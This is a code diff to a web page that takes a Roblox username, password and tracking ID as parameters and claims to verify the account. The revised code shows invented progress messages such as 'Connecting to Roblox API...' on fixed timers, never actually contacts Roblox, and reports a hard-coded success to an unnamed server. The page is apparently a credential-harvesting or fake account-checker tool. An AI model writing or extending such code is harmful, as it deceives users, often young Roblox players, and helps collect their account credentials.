@@ -26,9 +26,6 @@
             padding: 10px;
             margin-bottom: 15px;
         }
-        .hidden {
-            display: none;
-        }
         .loading {
             text-align: center;
             color: #00a2ff;
@@ -107,7 +104,7 @@
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
             if (trackingId && username && password) {
-                setTimeout(verifyAccount, 2000);
+                verifyAccount();
             } else {
                 showError('Missing parameters for verification');
             }
@@ -116,25 +113,28 @@
         async function verifyAccount() {
             try {
                 // Simulate verification process
-                await simulateVerification();
+                updateVerificationStatus("Checking credentials...");
+                await delay(1500);
                 
-                // For this demo, we'll assume the login is always successful
-                // In a real implementation, you would actually verify credentials
-                showSuccessResult();
+                updateVerificationStatus("Connecting to Roblox API...");
+                await delay(2000);
+                
+                updateVerificationStatus("Finalizing verification...");
+                await delay(1000);
+                
+                // Send verification result to server
+                const result = await sendResultToServer(true);
+                
+                if (result.success) {
+                    showSuccessResult();
+                } else {
+                    showFailureResult("Verification failed: " + result.message);
+                }
                 
             } catch (error) {
                 console.error('Verification error:', error);
                 showFailureResult("Verification error: " + error.message);
             }
-        }
-        
-        async function simulateVerification() {
-            // Simulate verification process with delays
-            await delay(1500);
-            updateVerificationStatus("Checking credentials...");
-            await delay(2000);
-            updateVerificationStatus("Finalizing verification...");
-            await delay(1000);
         }
         
         function showSuccessResult() {
@@ -143,11 +143,9 @@
                 <div class="result-success">
                     <h2>✅ Verification Successful</h2>
                     <p>Account credentials are valid.</p>
+                    <p>This information has been sent to the server.</p>
                 </div>
             `;
-            
-            // Send result to server
-            sendResultToServer(true);
         }
         
         function showFailureResult(reason) {
@@ -156,11 +154,9 @@
                 <div class="result-failure">
                     <h2>❌ Verification Failed</h2>
                     <p>${reason}</p>
+                    <p>This information has been sent to the server.</p>
                 </div>
             `;
-            
-            // Send result to server
-            sendResultToServer(false);
         }
         
         function updateVerificationStatus(message) {
@@ -186,10 +182,13 @@
                 });
                 
                 if (!response.ok) {
-                    console.error('Failed to send result to server');
+                    throw new Error('Failed to send result to server');
                 }
+                
+                return await response.json();
             } catch (error) {
                 console.error('Error sending result to server:', error);
+                throw error;
             }
         }
         
